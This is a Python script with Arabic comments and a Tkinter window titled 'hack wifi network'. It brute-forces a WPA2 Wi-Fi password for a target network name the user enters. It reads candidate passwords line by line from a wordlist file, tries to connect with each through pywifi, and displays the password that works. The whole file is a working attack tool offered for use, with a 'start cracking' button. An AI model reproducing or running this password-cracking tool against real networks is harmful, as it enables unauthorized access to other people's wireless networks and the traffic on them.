from tkinter import *
from pywifi import const
import pywifi
import time

# خطوات رئيسية:
# 1 ، احصل على أول بطاقة شبكة لاسلكية
# 2 ، افصل جميع شبكات wifi
# 3.قراءة كتاب كلمة المرور
# 4 ، اضبط وقت النوم

# اختبار الاتصال
def wificonnect(str,wifiname):
    # نافذة كائن لاسلكي
    wifi = pywifi.PyWiFi()
    # احصل على أول بطاقة شبكة لاسلكية
    ifaces = wifi.interfaces()[0]
    # افصل جميع شبكات wifi
    ifaces.disconnect()
    time.sleep(1)
    if ifaces.status()==const.IFACE_DISCONNECTED:
        # إنشاء ملف اتصال wifi
        profile = pywifi.Profile()
        profile.ssid = wifiname
        # خوارزمية تشفير wifi
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #wifi كلمة المرور
        profile.key = str
        # تطوير NIC
        profile.auth = const.AUTH_ALG_OPEN
        # وحدة التشفير ، هنا تحتاج إلى كتابة بعض وحدة التشفير أو لا يمكنك الاتصال
        profile.cipher = const.CIPHER_TYPE_CCMP

        # حذف جميع ملفات wifi
        ifaces.remove_all_network_profiles()
        # قم بإعداد ملف اتصال جديد
        tep_profile = ifaces.add_network_profile(profile)
        # ربط
        ifaces.connect(tep_profile)
        time.sleep(3)

        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False


def readPwd():
    # احصل على اسم wiif
    wifiname = entry.get().strip()

    path = r'./wifipwd.txt'
    file = open(path,'r')
    while True:
        try:
            # اقرأ
            mystr = file.readline().strip()
            # اختبار الاتصال
            bool = wificonnect(mystr,wifiname)
            if bool:
                text.insert(END,"كلمه مرور صحيحه"+mystr)
                text.see(END)
                text.update()
                file.close()
                break
            else:
                text.insert(END,"كلمة مرور خاطئة"+mystr)
                text.see(END)
                text.update()

        except: continue

# إنشاء نافذة
root = Tk()
root.title("اختراق شبكة wifi")
root.geometry('500x400')

# علامات
label = Label(root,text="أدخل اسم WIFI المراد اختراقه:")
# الاستهداف
label.grid()
# التحكم في الإدخال
entry  = Entry(root,font=("Microsoft Yahei",14))
entry.grid(row=0,column=1)
# التحكم بالقائمة
text =Listbox(root,font=("Microsoft Yahei",14),width=40,height=10)
text.grid(row=1,columnspan=2)
#
button = Button(root,text = "ابدأ التصدع",width=20,height=2,command=readPwd)
button.grid(row=2,columnspan=2)

# نافذة العرض
root.mainloop()

